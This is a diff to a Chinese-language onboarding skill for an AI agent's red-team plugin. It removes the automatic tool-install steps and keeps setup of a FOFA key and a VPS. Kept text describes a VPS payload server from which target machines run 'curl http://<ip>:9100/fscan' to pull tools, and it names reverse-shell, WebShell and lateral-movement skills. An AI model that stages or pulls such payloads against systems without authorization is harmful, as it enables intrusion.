@@ -1,6 +1,6 @@
 ---
 name: redteam-setup
-description: 首次使用引导：一键装齐红队工具与技能、引导提供 FOFA_KEY 与 VPS 登录方式、验证全部通道可用
+description: 首次使用引导：引导提供 FOFA_KEY 与 VPS 登录方式、验证通道可用、给出降级口径（工具链由工具箱附件按需获取）
 whenToUse: 用户第一次使用红队模式时；或 redteam_preflight 报出 onboarding.incomplete / 有技能 broken 时；或用户说"环境没配好""工具装一下"
 role: plan
 enabled: true
@@ -15,7 +15,7 @@ enabled: true
 
 **核心原则**：**一次性把话说完，一次要齐**。不要挤牙膏式反复找用户要东西——那是这套引导存在的唯一理由。
 
-## 〇、先确认你有没有"工具箱"（npm 版默认没有）
+## 一、先确认你有没有"工具箱"（npm 版默认没有）
 
 npm 版 `dsh-redteam-mode` **不随包分发工具安装脚本与 9 份攻击链技能**（隧道 / 凭据 /
 WebShell / 反弹 Shell / 横向移动 / 未授权利用）。原因：npm 的发布期自动审查会把
@@ -30,35 +30,7 @@ WebShell / 反弹 Shell / 横向移动 / 未授权利用）。原因：npm 的�
 
 > **红线**：本插件**不替用户下载或安装任何安全工具**。需要什么，说清获取位置，由用户自己取、自己执行。
 
-## 一、先跑体检（不装任何东西，10 秒）
-
-```bash
-bash "$DSH_HOME/redteam/setup.sh" --check     # 仅当本机存在该脚本
-```
-
-它输出四块：① PATH 系统工具 ② nuclei 模板库 ③ 配置（FOFA_KEY / VPS） ④ 工具箱二进制体检表。
-把这四块结论**如实复述**给用户，尤其 `✗` 与 `!` 的项。
-
-## 二、再一键装齐（缺什么装什么，幂等可重跑）
-
-```bash
-bash "$DSH_HOME/redteam/setup.sh" --yes      # 全自动：缺的工具自动下载，配置用已有值
-bash "$DSH_HOME/redteam/setup.sh"            # 交互式：会引导用户粘贴 FOFA_KEY 等
-```
-
-> 这一步**只有在本机已经有该脚本时**才做（见第〇节）。脚本由**用户自己**从工具箱附件取得并执行，
-> 智能体不要代跑、更不要代下载。
-
-特性说明（可以这样告诉用户）：
-- **幂等**：随时可重跑，已装的不重装；`--force` 才强制重下。
-- **不猜 URL**：所有下载都走 GitHub `releases/latest` API 取真实资产。
-- **不动系统**：只写 `$DSH_HOME/redteam/toolkit/` 与 `$DSH_HOME/.env` 两个位置，不装系统包、不改网络配置。
-- **日志**：`$DSH_HOME/redteam/setup.log`。
-
-需要 apt 装的系统工具（脚本只提示，不擅自 sudo）：`nmap masscan nuclei sqlmap ffuf feroxbuster gobuster hydra john hashcat wpscan nikto whatweb msfconsole` ——
-**要装的话必须让用户自己执行**（智能体不跑 sudo）。
-
-## 三、要用户提供什么（一次列清，说清"为什么"和"给到哪"）
+## 二、要用户提供什么（一次列清，说清"为什么"和"给到哪"）
 
 | 要什么 | 为什么必须 | 给到哪 | 没有会怎样 |
 | --- | --- | --- | --- |
@@ -84,36 +56,29 @@ bash "$DSH_HOME/redteam/setup.sh"            # 交互式：会引导用户粘贴
 - **载荷分发服务**：VPS 上 `~/payload` 目录 + `python3 -m http.server 9100`（tmux 常驻），
   目标机可 `curl http://<ip>:9100/fscan` 直接拉工具。
 
-## 四、装配完的验证（必须做完才算引导成功）
+## 三、配置完的验证（必须做完才算引导成功）
 
 逐项实测，**不要只看"文件存在"**：
 
 ```bash
-# 1) 二进制可执行
-$DSH_HOME/redteam/toolkit/fscan/fscan -h 2>&1 | head -3
-$DSH_HOME/redteam/toolkit/gogo/gogo -h 2>&1 | head -3
-$DSH_HOME/redteam/toolkit/chisel/chisel --version
-$DSH_HOME/redteam/toolkit/frp/frpc -v
-$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64 --help 2>&1 | head -3
-
-# 2) nuclei 模板库
-nuclei -tl 2>/dev/null | wc -l        # 应有上万条
-
-# 3) FOFA key 有效
+# 1) FOFA key 有效
 curl -s "https://fofa.info/api/v1/info/my?key=$FOFA_KEY" | grep -o '"error":[a-z]*'
 
-# 4) VPS 可达 + 载荷服务在跑
-ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes <user>@<ip> 'ss -lnt | grep 9100'
-curl -s -o /dev/null -w '%{http_code}\n' http://<ip>:9100/       # 应为 200
+# 2) VPS 可达（载荷服务是否在跑由工具箱的体检脚本负责）
+ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes <user>@<ip> 'echo ok'
 
-# 5) 技能注册表可见新技能
-#    用 redteam_preflight 复核，看 available 列表里是否含 nuclei-scan / credential-attack 等
+# 3) 技能注册表可见
+#    用 redteam_preflight 复核，看 available 列表里实际有哪些技能
 ```
 
-## 五、最后一步：写完成标记并复核
+> 工具二进制与 nuclei 模板库的体检由工具箱里的 `redteam-setup.sh --check` 负责
+> （npm 版不含该脚本，见第一节）。
+## 四、最后一步：写完成标记并复核
+
+配置补齐后，写完成标记（有工具箱脚本时脚本 `--yes` 会自动写；没有就手动写）：
 
 ```bash
-bash "$DSH_HOME/redteam/setup.sh" --yes   # 会写 $DSH_HOME/redteam/.setup-complete
+mkdir -p "$DSH_HOME/redteam" && date -Is > "$DSH_HOME/redteam/.setup-complete"
 ```
 
 然后**再跑一次 `redteam_preflight`**，确认：`onboarding.complete=true`、`broken` 为空或只剩用户明确接受降级的项。
@@ -122,7 +87,7 @@ bash "$DSH_HOME/redteam/setup.sh" --yes   # 会写 $DSH_HOME/redteam/.setup-comp
 **改了 `$DSH_HOME/.env` 后必须重启 dsh web**，否则当前进程读不到新的环境变量——
 这一步要明确告诉用户（智能体不能替他重启）。
 
-## 六、用户就是不给某些资源时（降级口径）
+## 五、用户就是不给某些资源时（降级口径）
 
 | 缺什么 | 降级方案 | 必须向用户说明的限制 |
 | --- | --- | --- |
